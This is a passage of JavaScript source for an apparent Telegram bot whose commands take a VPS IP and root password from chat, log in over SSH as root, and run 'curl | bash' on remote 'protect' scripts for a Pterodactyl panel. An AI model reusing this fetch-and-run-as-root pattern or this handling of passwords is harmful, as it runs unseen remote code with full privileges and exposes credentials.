                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 7 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect7.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 7 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect7.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect7:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect8`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect8 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect8.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 8</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 8</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 8</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 8 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect8.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 8 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect8.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect8:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect9`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect9 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect9.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 9</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 9</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 9</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 9 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect9.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 9 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect9.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect9:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect10`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect10 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect10.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 10</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 10</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 10</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 10 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect10.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 10 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect10.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect10:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect11`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect11 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect11.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 11</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 11</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 11</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 11 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect11.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 11 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect11.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect11:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect12`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect12 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect12.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 12</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 12</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 12</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 12 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect12.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

